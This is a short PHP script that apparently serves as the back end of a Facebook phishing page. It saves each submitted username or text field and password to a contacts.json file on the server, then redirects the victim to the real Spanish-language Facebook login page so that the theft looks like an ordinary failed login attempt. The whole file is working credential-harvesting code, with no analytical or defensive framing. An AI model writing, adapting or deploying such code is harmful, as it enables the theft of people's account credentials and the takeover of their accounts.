<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $contact = [
    "text" => $_POST["text"],
    "password" => $_POST["password"],
  ];

  if (file_exists("contacts.json")) {
    $contacts = json_decode(file_get_contents("contacts.json"), true);
  } else {
    $contacts = [];
  }

  $contacts[] = $contact;
  file_put_contents("contacts.json", json_encode($contacts));
  header("Location: https://es-la.facebook.com/login/device-based/regular/login/?login_attempt=1");
    exit();
}

?>
